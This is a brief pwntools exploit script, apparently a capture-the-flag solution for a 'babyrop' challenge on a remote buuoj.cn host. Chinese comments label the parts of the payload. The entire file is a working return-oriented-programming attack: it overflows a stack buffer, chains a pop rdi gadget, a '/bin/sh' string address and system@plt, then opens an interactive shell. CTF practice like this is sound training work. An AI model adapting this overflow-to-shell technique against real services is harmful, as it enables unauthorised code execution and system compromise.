# coding=utf-8

from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

 
#p = process('./babyrop')
p = remote('node3.buuoj.cn', 28905)
elf = ELF('./babyrop')

padding = 'a' * 0x10        # 垃圾字节
fake_ebp = "k1ose2jo"       # ebp覆盖
system_addr = 0x0400490     # system函数所在plt地址
bin_sh_addr = 0x0601048     # 后门字符串地址
pop_rdi_addr = 0x0400683    # ropper找到pop rdi;写入system地址
payload = padding + fake_ebp + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)

p.sendline(payload)
p.interactive()
